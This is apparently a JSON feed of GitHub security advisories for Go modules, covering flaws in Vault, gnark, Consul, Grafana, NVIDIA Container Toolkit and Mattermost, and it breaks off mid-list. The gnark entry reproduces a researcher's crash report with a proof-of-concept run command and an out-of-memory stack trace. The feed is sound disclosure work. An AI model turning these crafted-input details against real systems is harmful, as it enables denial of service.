{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>Vault Community and Vault Enterprise (“Vault”) clusters using Vault’s Integrated Storage backend are vulnerable to a denial-of-service (DoS) attack through memory exhaustion through a Raft cluster join API endpoint. An attacker may send a large volume of requests to the endpoint which may cause Vault to consume excessive system memory resources, potentially leading to a crash of the underlying system and the Vault process itself.</p>\n<p>This vulnerability, CVE-2024-8185, is fixed in Vault Community 1.18.1 and Vault Enterprise 1.18.1, 1.17.8, and 1.16.12.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8185\">https://nvd.nist.gov/vuln/detail/CVE-2024-8185</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2024-26-vault-vulnerable-to-denial-of-service-through-memory-exhaustion-when-processing-raft-cluster-join-requests/71047\">https://discuss.hashicorp.com/t/hcsec-2024-26-vault-vulnerable-to-denial-of-service-through-memory-exhaustion-when-processing-raft-cluster-join-requests/71047</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/commit/195dfca433028887973f5bd82d173d91fe9dab4a\">https://github.com/hashicorp/vault/commit/195dfca433028887973f5bd82d173d91fe9dab4a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g233-2p4r-3q7v\">https://github.com/advisories/GHSA-g233-2p4r-3q7v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g233-2p4r-3q7v",
            "title": "[github.com/hashicorp/vault] Hashicorp Vault vulnerable to denial of service through memory exhaustion",
            "date_modified": "2024-10-31T20:46:35.000Z",
            "date_published": "2024-10-31T18:31:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g233-2p4r-3q7v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Thanks @pventuzelo for reporting.</p>\n<p>From the correspondence:</p>\n<blockquote>\n<p>Hi,</p>\n<p>We (Fuzzinglabs &amp; Lambdaclass) found that during deserialization of certain files representing a <code>VerifyingKey</code>, an excessive memory allocation is happening consuming a lot of resources and even triggering a crash with the error <code>fatal error: runtime: out of memory</code>.</p>\n<p>Please find the details below:</p>\n<h2 id=\"vulnerability-details\">Vulnerability Details</h2>\n<ul>\n<li><strong>Severity:</strong> Critical -&gt; DoS</li>\n<li><strong>Affected Component:</strong> Deserialization</li>\n</ul>\n<h2 id=\"environment\">Environment</h2>\n<ul>\n<li><p><strong>Compiler Version:</strong> go version go1.22.2 linux/amd64</p>\n</li>\n<li><p><strong>Distro Version:</strong> Ubuntu 24.04.1 LTS</p>\n</li>\n<li><p><strong>Additional Environment Details:</strong></p>\n<ul>\n<li><code>[github.com/consensys/gnark](http://github.com/consensys/gnark) v0.11.0</code></li>\n<li><code>[github.com/consensys/gnark-crypto](http://github.com/consensys/gnark-crypto) v0.14.1-0.20240909142611-e6b99e74cec1</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"steps-to-reproduce\">Steps to Reproduce</h2>\n<p>You can download the needed files here: <a href=\"https://drive.google.com/drive/folders/1KQ5I3vv4bUllvqbatGappwbAkIcR2NI_?usp=sharing\">https://drive.google.com/drive/folders/1KQ5I3vv4bUllvqbatGappwbAkIcR2NI_?usp=sharing</a></p>\n<p>You have to run</p>\n<pre><code class=\"language-shell\">go run gnark_poc.go\n</code></pre>\n<p>in a terminal.</p>\n<p>Running the provided code will result in a memory crash or an extremely large memory allocation, which can be observed using the following command:</p>\n<pre><code class=\"language-shell\">go tool pprof -web mem.pprof\n</code></pre>\n<h2 id=\"root-cause-analysis\">Root Cause Analysis</h2>\n<p>The provided code loads a <code>VerifyingKey</code> from <code>old.vk</code> by calling the <code>ReadFrom</code> function. This function is implemented in <a href=\"https://github.com/Consensys/gnark/blob/ca8e1568f47ae6b717eda0a6734d87645edaecf7/backend/groth16/bn254/marshal.go#L174C2-L174C25\">backend/groth16/bn254/marshal.go</a> within the <a href=\"https://github.com/Consensys/gnark\">gnark</a> library.</p>\n<p>The provided example uses the elliptic curve BN-254, so the code resides in the <a href=\"https://github.com/Consensys/gnark/blob/ca8e1568f47ae6b717eda0a6734d87645edaecf7/backend/groth16/bn254/\">backend/groth16/bn254/</a> repertory. However, the same error exists in other repertories, such as <a href=\"https://github.com/Consensys/gnark/blob/ca8e1568f47ae6b717eda0a6734d87645edaecf7/backend/groth16/bls12-377/\">backend/groth16/bls12-377/</a>.</p>\n<p>At <a href=\"https://github.com/Consensys/gnark/blob/ca8e1568f47ae6b717eda0a6734d87645edaecf7/backend/groth16/bn254/marshal.go#L207\">line 207</a>, a slice is allocated with a length of <code>nbCommitments</code>. This variable is directly extracted from the deserialized file, which, in our case, has a value of <code>2,327,186,600</code>. This large value may be too big for some configurations, leading to memory allocations of approximately ±1 TB, as observed with <code>pprof</code>.</p>\n<h2 id=\"detailed-behavior\">Detailed Behavior</h2>\n<pre><code class=\"language-shell\">go run gnark_poc.go\n</code></pre>\n<pre><code>fatal error: runtime: out of memory\n\nruntime stack:\nruntime.throw({0x5fe946?, 0x2052ae?})\n/usr/lib/go-1.22/src/runtime/panic.go:1023 +0x5c fp=0x7ffd65b321a0 sp=0x7ffd65b32170 pc=0x438a9c\nruntime.sysMapOS(0xc000400000, 0x8ab6400000)\n/usr/lib/go-1.22/src/runtime/mem_linux.go:167 +0x11b fp=0x7ffd65b321e0 sp=0x7ffd65b321a0 pc=0x418bbb\nruntime.sysMap(0xc000400000, 0x8ab6400000, 0x7b19c8?)\n/usr/lib/go-1.22/src/runtime/mem.go:155 +0x34 fp=0x7ffd65b32200 sp=0x7ffd65b321e0 pc=0x418634\nruntime.(*mheap).grow(0x7a17c0, 0x455b066?)\n/usr/lib/go-1.22/src/runtime/mheap.go:1534 +0x236 fp=0x7ffd65b32270 sp=0x7ffd65b32200 pc=0x42b176\nruntime.(*mheap).allocSpan(0x7a17c0, 0x455b066, 0x0, 0x1)\n/usr/lib/go-1.22/src/runtime/mheap.go:1246 +0x1b0 fp=0x7ffd65b32310 sp=0x7ffd65b32270 pc=0x42a850\nruntime.(*mheap).alloc.func1()\n/usr/lib/go-1.22/src/runtime/mheap.go:964 +0x5c fp=0x7ffd65b32358 sp=0x7ffd65b32310 pc=0x42a2fc\nruntime.systemstack(0x46d79f)\n/usr/lib/go-1.22/src/runtime/asm_amd64.s:509 +0x4a fp=0x7ffd65b32368 sp=0x7ffd65b32358 pc=0x46912a\n\ngoroutine 1 gp=0xc0000061c0 m=0 mp=0x798ca0 [running]:\nruntime.systemstack_switch()\n/usr/lib/go-1.22/src/runtime/asm_amd64.s:474 +0x8 fp=0xc000031b68 sp=0xc000031b58 pc=0x4690c8\nruntime.(*mheap).alloc(0x5bc040?, 0xc00012bb08?, 0xa0?)\n/usr/lib/go-1.22/src/runtime/mheap.go:958 +0x5b fp=0xc000031bb0 sp=0xc000031b68 pc=0x42a25b\nruntime.(*mcache).allocLarge(0xc000126510?, 0x8ab60ca800, 0x1)\n/usr/lib/go-1.22/src/runtime/mcache.go:234 +0x87 fp=0xc000031c00 sp=0xc000031bb0 pc=0x4176e7\nruntime.mallocgc(0x8ab60ca800, 0x5d92a0, 0x1)\n/usr/lib/go-1.22/src/runtime/malloc.go:1165 +0x597 fp=0xc000031c88 sp=0xc000031c00 pc=0x40ef97\nruntime.makeslice(0xc00011c180?, 0x0?, 0x2?)\n/usr/lib/go-1.22/src/runtime/slice.go:107 +0x49 fp=0xc000031cb0 sp=0xc000031c88 pc=0x4500c9\n[github.com/consensys/gnark/backend/groth16/bn254.(*VerifyingKey).readFrom(0xc0001b7088](http://github.com/consensys/gnark/backend/groth16/bn254.(*VerifyingKey).readFrom(0xc0001b7088), {0x6598a0, 0xc00011dc50}, 0x0)\n/home/raunan/go/pkg/mod/[github.com/!ronan!thoraval/gnark@v0.0.0-20241007163125-4c0a7511c3d1/backend/groth16/bn254/marshal.go:214](http://github.com/!ronan!thoraval/gnark@v0.0.0-20241007163125-4c0a7511c3d1/backend/groth16/bn254/marshal.go:214) +0x765 fp=0xc000031ea8 sp=0xc000031cb0 pc=0x59b205\n[github.com/consensys/gnark/backend/groth16/bn254.(*VerifyingKey).ReadFrom(0x100469020](http://github.com/consensys/gnark/backend/groth16/bn254.(*VerifyingKey).ReadFrom(0x100469020)?, {0x6598a0?, 0xc00011dc50?})\n/home/raunan/go/pkg/mod/[github.com/!ronan!thoraval/gnark@v0.0.0-20241007163125-4c0a7511c3d1/backend/groth16/bn254/marshal.go:166](http://github.com/!ronan!thoraval/gnark@v0.0.0-20241007163125-4c0a7511c3d1/backend/groth16/bn254/marshal.go:166) +0x1f fp=0xc000031ed8 sp=0xc000031ea8 pc=0x59aa5f\nmain.main()\n/home/raunan/gnark_poc/gnark_poc/gnark_poc.go:19 +0xba fp=0xc000031f50 sp=0xc000031ed8 pc=0x5addda\nruntime.main()\n/usr/lib/go-1.22/src/runtime/proc.go:271 +0x29d fp=0xc000031fe0 sp=0xc000031f50 pc=0x43b55d\nruntime.goexit({})\n/usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc000031fe8 sp=0xc000031fe0 pc=0x46b0e1\n\ngoroutine 2 gp=0xc000006c40 m=nil [force gc (idle)]:\nruntime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)\n/usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000074fa8 sp=0xc000074f88 pc=0x43b98e\nruntime.goparkunlock(...)\n/usr/lib/go-1.22/src/runtime/proc.go:408\nruntime.forcegchelper()\n/usr/lib/go-1.22/src/runtime/proc.go:326 +0xb3 fp=0xc000074fe0 sp=0xc000074fa8 pc=0x43b813\nruntime.goexit({})\n/usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc000074fe8 sp=0xc000074fe0 pc=0x46b0e1\ncreated by runtime.init.6 in goroutine 1\n/usr/lib/go-1.22/src/runtime/proc.go:314 +0x1a\n\ngoroutine 3 gp=0xc000007180 m=nil [GC sweep wait]:\nruntime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)\n/usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000075780 sp=0xc000075760 pc=0x43b98e\nruntime.goparkunlock(...)\n/usr/lib/go-1.22/src/runtime/proc.go:408\nruntime.bgsweep(0xc0000240e0)\n/usr/lib/go-1.22/src/runtime/mgcsweep.go:278 +0x94 fp=0xc0000757c8 sp=0xc000075780 pc=0x426cf4\nruntime.gcenable.gowrap1()\n/usr/lib/go-1.22/src/runtime/mgc.go:203 +0x25 fp=0xc0000757e0 sp=0xc0000757c8 pc=0x41b845\nruntime.goexit({})\n/usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc0000757e8 sp=0xc0000757e0 pc=0x46b0e1\ncreated by runtime.gcenable in goroutine 1\n/usr/lib/go-1.22/src/runtime/mgc.go:203 +0x66\n\ngoroutine 4 gp=0xc000007340 m=nil [GC scavenge wait]:\nruntime.gopark(0xc0000240e0?, 0x657100?, 0x1?, 0x0?, 0xc000007340?)\n/usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000075f78 sp=0xc000075f58 pc=0x43b98e\nruntime.goparkunlock(...)\n/usr/lib/go-1.22/src/runtime/proc.go:408\nruntime.(*scavengerState).park(0x797520)\n/usr/lib/go-1.22/src/runtime/mgcscavenge.go:425 +0x49 fp=0xc000075fa8 sp=0xc000075f78 pc=0x4246e9\nruntime.bgscavenge(0xc0000240e0)\n/usr/lib/go-1.22/src/runtime/mgcscavenge.go:653 +0x3c fp=0xc000075fc8 sp=0xc000075fa8 pc=0x424c7c\nruntime.gcenable.gowrap2()\n/usr/lib/go-1.22/src/runtime/mgc.go:204 +0x25 fp=0xc000075fe0 sp=0xc000075fc8 pc=0x41b7e5\nruntime.goexit({})\n/usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc000075fe8 sp=0xc000075fe0 pc=0x46b0e1\ncreated by runtime.gcenable in goroutine 1\n/usr/lib/go-1.22/src/runtime/mgc.go:204 +0xa5\n\ngoroutine 18 gp=0xc000102700 m=nil [finalizer wait]:\nruntime.gopark(0xc000074648?, 0x40f445?, 0xa8?, 0x1?, 0xc0000061c0?)\n/usr/lib/go-1.22/src/runtime/proc.go:402 +0xce fp=0xc000074620 sp=0xc000074600 pc=0x43b98e\nruntime.runfinq()\n/usr/lib/go-1.22/src/runtime/mfinal.go:194 +0x107 fp=0xc0000747e0 sp=0xc000074620 pc=0x41a887\nruntime.goexit({})\n/usr/lib/go-1.22/src/runtime/asm_amd64.s:1695 +0x1 fp=0xc0000747e8 sp=0xc0000747e0 pc=0x46b0e1\ncreated by runtime.createfing in goroutine 1\n/usr/lib/go-1.22/src/runtime/mfinal.go:164 +0x3d\nexit status 2\n</code></pre>\n<h2 id=\"appendices\">Appendices</h2>\n<p>This problem can also happen with <code>ProvingKey</code>.</p>\n</blockquote>\n<h3 id=\"impact\">Impact</h3>\n<p>Prover and verifier denial of service in case of maliciously crafted inputs (public key, verification key).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue is patched in <a href=\"https://github.com/Consensys/gnark/pull/1307\">https://github.com/Consensys/gnark/pull/1307</a>. It was merged to gnark master at <a href=\"https://github.com/Consensys/gnark/commit/47ae846339add2bdf9983e499342bfdfe195191d\">https://github.com/Consensys/gnark/commit/47ae846339add2bdf9983e499342bfdfe195191d</a>. The fix will be incorporated in the next minor release of gnark (v0.11.1).</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no convenient work-arounds currently. The best approach currently is to run key verification as a separate service which halts the verification pipeline in case of OOM when verification keys come from untrusted sources.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Consensys/gnark/security/advisories/GHSA-cph5-3pgr-c82g\">https://github.com/Consensys/gnark/security/advisories/GHSA-cph5-3pgr-c82g</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-50354\">https://nvd.nist.gov/vuln/detail/CVE-2024-50354</a></li>\n<li><a href=\"https://github.com/Consensys/gnark/pull/1307\">https://github.com/Consensys/gnark/pull/1307</a></li>\n<li><a href=\"https://github.com/Consensys/gnark/commit/47ae846339add2bdf9983e499342bfdfe195191d\">https://github.com/Consensys/gnark/commit/47ae846339add2bdf9983e499342bfdfe195191d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cph5-3pgr-c82g\">https://github.com/advisories/GHSA-cph5-3pgr-c82g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cph5-3pgr-c82g",
            "title": "[github.com/consensys/gnark] Gnark out-of-memory during deserialization with crafted inputs",
            "date_modified": "2024-10-31T20:37:00.000Z",
            "date_published": "2024-10-31T20:37:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cph5-3pgr-c82g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was identified in Consul and Consul Enterprise such that the server response did not explicitly set a Content-Type HTTP header, allowing user-provided inputs to be misinterpreted and lead to reflected XSS.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-10086\">https://nvd.nist.gov/vuln/detail/CVE-2024-10086</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2024-24-consul-vulnerable-to-reflected-xss-on-content-type-error-manipulation\">https://discuss.hashicorp.com/t/hcsec-2024-24-consul-vulnerable-to-reflected-xss-on-content-type-error-manipulation</a></li>\n<li><a href=\"https://github.com/hashicorp/consul/commit/07fae7bb0be8593cc98c38b1ef4a49ed9188932f\">https://github.com/hashicorp/consul/commit/07fae7bb0be8593cc98c38b1ef4a49ed9188932f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-99wr-c2px-grmh\">https://github.com/advisories/GHSA-99wr-c2px-grmh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-99wr-c2px-grmh",
            "title": "[github.com/hashicorp/consul] Hashicorp Consul Cross-site Scripting vulnerability",
            "date_modified": "2024-10-31T14:55:00.000Z",
            "date_published": "2024-10-31T00:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-99wr-c2px-grmh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was identified in Consul and Consul Enterprise (\"Consul\") such that using Headers in L7 traffic intentions could bypass HTTP header based access rules.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-10006\">https://nvd.nist.gov/vuln/detail/CVE-2024-10006</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2024-23-consul-l7-intentions-vulnerable-to-headers-bypass\">https://discuss.hashicorp.com/t/hcsec-2024-23-consul-l7-intentions-vulnerable-to-headers-bypass</a></li>\n<li><a href=\"https://github.com/hashicorp/consul/pull/21816\">https://github.com/hashicorp/consul/pull/21816</a></li>\n<li><a href=\"https://github.com/hashicorp/consul/commit/d9206fc7e284a9244af4d62f8653a63ca30bd00c\">https://github.com/hashicorp/consul/commit/d9206fc7e284a9244af4d62f8653a63ca30bd00c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5c4w-8hhh-3c3h\">https://github.com/advisories/GHSA-5c4w-8hhh-3c3h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5c4w-8hhh-3c3h",
            "title": "[github.com/hashicorp/consul] Hashicorp Consul Improper Neutralization of HTTP Headers for Scripting Syntax vulnerability",
            "date_modified": "2024-10-31T14:49:34.000Z",
            "date_published": "2024-10-31T00:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5c4w-8hhh-3c3h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was identified in Consul and Consul Enterprise (\"Consul\") such that using URL paths in L7 traffic intentions could bypass HTTP request path-based access rules.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-10005\">https://nvd.nist.gov/vuln/detail/CVE-2024-10005</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2024-22-consul-l7-intentions-vulnerable-to-url-path-bypass\">https://discuss.hashicorp.com/t/hcsec-2024-22-consul-l7-intentions-vulnerable-to-url-path-bypass</a></li>\n<li><a href=\"https://github.com/hashicorp/consul/pull/21816\">https://github.com/hashicorp/consul/pull/21816</a></li>\n<li><a href=\"https://github.com/hashicorp/consul/commit/d9206fc7e284a9244af4d62f8653a63ca30bd00c\">https://github.com/hashicorp/consul/commit/d9206fc7e284a9244af4d62f8653a63ca30bd00c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-chgm-7r52-whjj\">https://github.com/advisories/GHSA-chgm-7r52-whjj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-chgm-7r52-whjj",
            "title": "[github.com/hashicorp/consul] Hashicorp Consul Path Traversal vulnerability",
            "date_modified": "2024-10-31T14:49:28.000Z",
            "date_published": "2024-10-31T00:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-chgm-7r52-whjj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Organization admins can delete pending invites created in an organization they are not part of.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-10452\">https://nvd.nist.gov/vuln/detail/CVE-2024-10452</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2024-10452\">https://grafana.com/security/security-advisories/cve-2024-10452</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2024-10452\">https://www.cve.org/CVERecord?id=CVE-2024-10452</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-66c4-2g2v-54qw\">https://github.com/advisories/GHSA-66c4-2g2v-54qw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-66c4-2g2v-54qw",
            "title": "[github.com/grafana/grafana] Grafana org admin can delete pending invites in different org",
            "date_modified": "2024-10-29T20:29:54.000Z",
            "date_published": "2024-10-29T18:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-66c4-2g2v-54qw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>NVIDIA Container Toolkit 1.16.1 or earlier contains a vulnerability in the default mode of operation allowing a specially crafted container image to create empty files on the host file system. This does not impact use cases where CDI is used. A successful exploit of this vulnerability may lead to data tampering.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/NVIDIA/libnvidia-container/security/advisories/GHSA-xff4-h7r9-vrpf\">https://github.com/NVIDIA/libnvidia-container/security/advisories/GHSA-xff4-h7r9-vrpf</a></li>\n<li><a href=\"https://github.com/NVIDIA/nvidia-container-toolkit/security/advisories/GHSA-f748-7hpg-88ch\">https://github.com/NVIDIA/nvidia-container-toolkit/security/advisories/GHSA-f748-7hpg-88ch</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0133\">https://nvd.nist.gov/vuln/detail/CVE-2024-0133</a></li>\n<li><a href=\"https://advisory-inbox.githubapp.com/advisory_reviews/GHSA-wqq7-v22c-gpfp\">https://advisory-inbox.githubapp.com/advisory_reviews/GHSA-wqq7-v22c-gpfp</a></li>\n<li><a href=\"https://nvidia.custhelp.com/app/answers/detail/a_id/5582\">https://nvidia.custhelp.com/app/answers/detail/a_id/5582</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f748-7hpg-88ch\">https://github.com/advisories/GHSA-f748-7hpg-88ch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f748-7hpg-88ch",
            "title": "[github.com/NVIDIA/nvidia-container-toolkit] NVIDIA Container Toolkit allows specially crafted container image to create empty files on the host file system",
            "date_modified": "2024-10-29T19:52:42.000Z",
            "date_published": "2024-10-29T19:52:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f748-7hpg-88ch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-f748-7hpg-88ch. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>NVIDIA Container Toolkit 1.16.1 or earlier contains a vulnerability in the default mode of operation allowing a specially crafted container image to create empty files on the host file system. This does not impact use cases where CDI is used. A successful exploit of this vulnerability may lead to data tampering.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0133\">https://nvd.nist.gov/vuln/detail/CVE-2024-0133</a></li>\n<li><a href=\"https://nvidia.custhelp.com/app/answers/detail/a_id/5582\">https://nvidia.custhelp.com/app/answers/detail/a_id/5582</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g4pj-mx9f-m2mh\">https://github.com/advisories/GHSA-g4pj-mx9f-m2mh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g4pj-mx9f-m2mh",
            "title": "[github.com/NVIDIA/nvidia-container-toolkit] Duplicate Advisory: NVIDIA Container Toolkit allows specially crafted container image to create empty files on the host file system",
            "date_modified": "2024-10-29T19:52:31.000Z",
            "date_published": "2024-09-26T06:30:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g4pj-mx9f-m2mh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>NVIDIA Container Toolkit 1.16.1 or earlier contains a Time-of-check Time-of-Use (TOCTOU) vulnerability when used with default configuration where a specifically crafted container image may gain access to the host file system. This does not impact use cases where CDI is used. A successful exploit of this vulnerability may lead to code execution, denial of service, escalation of privileges, information disclosure, and data tampering.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/NVIDIA/gpu-operator/security/advisories/GHSA-95rf-r6p4-44h7\">https://github.com/NVIDIA/gpu-operator/security/advisories/GHSA-95rf-r6p4-44h7</a></li>\n<li><a href=\"https://github.com/NVIDIA/libnvidia-container/security/advisories/GHSA-q2v4-jw5g-9xxj\">https://github.com/NVIDIA/libnvidia-container/security/advisories/GHSA-q2v4-jw5g-9xxj</a></li>\n<li><a href=\"https://github.com/NVIDIA/nvidia-container-toolkit/security/advisories/GHSA-mjjw-553x-87pq\">https://github.com/NVIDIA/nvidia-container-toolkit/security/advisories/GHSA-mjjw-553x-87pq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0132\">https://nvd.nist.gov/vuln/detail/CVE-2024-0132</a></li>\n<li><a href=\"https://nvidia.custhelp.com/app/answers/detail/a_id/5582\">https://nvidia.custhelp.com/app/answers/detail/a_id/5582</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mjjw-553x-87pq\">https://github.com/advisories/GHSA-mjjw-553x-87pq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mjjw-553x-87pq",
            "title": "[github.com/NVIDIA/nvidia-container-toolkit] NVIDIA Container Toolkit contains a Time-of-check Time-of-Use (TOCTOU) vulnerability",
            "date_modified": "2024-10-29T19:48:12.000Z",
            "date_published": "2024-10-29T19:48:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mjjw-553x-87pq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-mjjw-553x-87pq. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>NVIDIA Container Toolkit 1.16.1 or earlier contains a Time-of-check Time-of-Use (TOCTOU) vulnerability when used with default configuration where a specifically crafted container image may gain access to the host file system. This does not impact use cases where CDI is used. A successful exploit of this vulnerability may lead to code execution, denial of service, escalation of privileges, information disclosure, and data tampering.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0132\">https://nvd.nist.gov/vuln/detail/CVE-2024-0132</a></li>\n<li><a href=\"https://nvidia.custhelp.com/app/answers/detail/a_id/5582\">https://nvidia.custhelp.com/app/answers/detail/a_id/5582</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-536j-xxhg-6pgg\">https://github.com/advisories/GHSA-536j-xxhg-6pgg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-536j-xxhg-6pgg",
            "title": "[github.com/NVIDIA/nvidia-container-toolkit] Duplicate Advisory: NVIDIA Container Toolkit contains a Time-of-check Time-of-Use (TOCTOU) vulnerability",
            "date_modified": "2024-10-29T19:48:00.000Z",
            "date_published": "2024-09-26T06:30:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-536j-xxhg-6pgg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 9.10.x &lt;= 9.10.2, 9.11.x &lt;= 9.11.1 and 9.5.x &lt;= 9.5.9 fail to&nbsp;prevent detailed error messages from being displayed&nbsp;in Playbooks which allows an attacker to generate a large response and cause an amplified GraphQL response which in turn could cause the application to crash by sending a specially crafted request to Playbooks.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47401\">https://nvd.nist.gov/vuln/detail/CVE-2024-47401</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-762v-rq7q-ff97\">https://github.com/advisories/GHSA-762v-rq7q-ff97</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-762v-rq7q-ff97",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Server vulnerable to application crash from attacker-generated large response",
            "date_modified": "2024-10-29T16:13:16.000Z",
            "date_published": "2024-10-29T09:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-762v-rq7q-ff97"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 9.10.x &lt;= 9.10.2, 9.11.x &lt;= 9.11.1, 9.5.x &lt;= 9.5.9 fail to&nbsp;check that the origin of the message in an integration action matches with the original post metadata&nbsp;which allows an authenticated user to delete an arbitrary post.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-50052\">https://nvd.nist.gov/vuln/detail/CVE-2024-50052</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g376-m3h3-mj4r\">https://github.com/advisories/GHSA-g376-m3h3-mj4r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g376-m3h3-mj4r",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost server allows authenticated user to delete arbitrary post",
            "date_modified": "2024-10-29T16:13:14.000Z",
            "date_published": "2024-10-29T09:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g376-m3h3-mj4r"
            },
            "tags": [
                "severity"
            ]
        },
        {
